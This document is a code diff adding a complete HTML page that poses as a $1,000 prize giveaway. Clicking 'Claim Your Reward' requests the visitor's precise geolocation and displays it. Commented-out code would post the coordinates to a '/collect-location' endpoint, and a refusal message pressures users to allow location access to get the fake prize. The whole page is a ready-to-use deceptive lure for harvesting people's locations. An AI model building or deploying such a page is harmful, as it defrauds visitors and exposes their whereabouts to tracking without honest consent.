@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Claim Your Reward!</title>
+    <!-- Tailwind CSS via CDN -->
+    <link
+      href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"
+      rel="stylesheet"
+    />
+  </head>
+  <body class="bg-gray-100 flex items-center justify-center min-h-screen">
+    <div class="bg-white shadow-lg rounded-lg p-6 max-w-md text-center">
+      <h1 class="text-2xl font-bold text-red-500 mb-2">Congratulations!</h1>
+      <p class="text-lg text-gray-700 mb-4">
+        You have been selected to receive an exclusive reward worth $1,000!
+      </p>
+      <p class="text-sm text-gray-500 italic mb-6">
+        Click the button below to claim your prize now.
+      </p>
+
+      <button
+        id="claimButton"
+        class="bg-blue-500 hover:bg-blue-600 text-white px-6 py-3 rounded-lg font-semibold shadow focus:outline-none focus:ring-2 focus:ring-blue-300 transition"
+      >
+        Claim Your Reward
+      </button>
+
+      <div id="message" class="mt-6 text-gray-700"></div>
+    </div>
+
+    <script>
+      const button = document.getElementById("claimButton");
+      const messageBox = document.getElementById("message");
+
+      button.addEventListener("click", () => {
+        // Check if Geolocation is available
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              const lat = position.coords.latitude;
+              const lng = position.coords.longitude;
+
+              // Show the coordinates on the page (for demonstration)
+              messageBox.textContent = `Congratulations! We have your location:
+Latitude: ${lat},
+Longitude: ${lng}`;
+
+              // Optionally, send this data to your server:
+              // fetch('/collect-location', {
+              //   method: 'POST',
+              //   headers: { 'Content-Type': 'application/json' },
+              //   body: JSON.stringify({ latitude: lat, longitude: lng })
+              // })
+              //   .then(response => response.json())
+              //   .then(data => console.log('Location saved:', data))
+              //   .catch(error => console.error('Error:', error));
+            },
+            (error) => {
+              messageBox.textContent =
+                "Unable to retrieve your location. Please allow location access to claim your reward!";
+            },
+            {
+              enableHighAccuracy: true,
+              timeout: 10000,
+              maximumAge: 0,
+            }
+          );
+        } else {
+          messageBox.textContent =
+            "Geolocation is not supported by your browser.";
+        }
+      });
+    </script>
+  </body>
+</html>
